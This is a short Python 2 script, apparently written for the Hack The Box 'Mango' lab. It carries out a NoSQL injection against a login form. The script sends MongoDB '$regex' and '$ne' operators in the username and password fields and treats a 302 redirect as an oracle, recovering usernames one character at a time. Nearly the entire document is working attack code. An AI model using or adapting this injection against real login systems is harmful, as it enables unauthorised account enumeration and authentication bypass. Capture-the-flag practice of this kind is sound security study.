from requests import post
from string import lowercase

url = 'http://staging-order.mango.htb/'
valid = ['a','d','g','i','m','n','o']

def sendPayload(word):
    for char in valid:
        regex = '^{}.*'.format(word+char)
        data = { 'username[$regex]':regex, 'password[$ne]':'password','login':'login' }
        response = post(url, data=data, allow_redirects=False)
        if response.status_code == 302:
            return char
    return None

def getUser():
    for ch in ['a','m']:
        username = ch
        while True:
            char = sendPayload(username)
            if char != None:
                username += char
            else:
                print "Username found: {}".format(username)
                break

if __name__ == '__main__':
    getUser()
